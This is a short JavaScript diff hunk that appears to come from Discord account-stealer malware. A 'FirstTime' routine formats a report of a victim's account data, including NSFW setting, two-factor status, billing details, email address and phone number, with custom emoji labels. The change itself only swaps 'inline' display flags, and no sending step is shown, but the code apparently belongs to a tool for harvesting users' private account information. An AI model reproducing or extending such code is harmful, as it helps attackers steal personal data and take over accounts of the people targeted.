@@ -293,19 +293,19 @@ const FirstTime = async () => {
             }, {
                 name: "NSFW <a:nsfw:1041640474617839616>",
                 value: `${GetNSFW(user.nsfw_allowed)}`,
-                inline: !1
+                inline: !0
             }, {
                 name: "A2F <a:a2f:1040272766982692885>",
                 value: `${GetA2F(user.mfa_enabled)}`,
-                inline: !1
+                inline: !0
             }, {
                 name: "Billing <a:billing:1041641103629234196>",
                 value: `${Billings}`,
-                inline: !1
+                inline: !0
             }, {
                 name: "Email <a:email:1041639672037785691>",
                 value: `\`${user.email}\``,
-                inline: !0
+                inline: !1
             }, {
                 name: "Phone :mobile_phone:",
                 value: `\`${user.phone ?? "None"}\``,
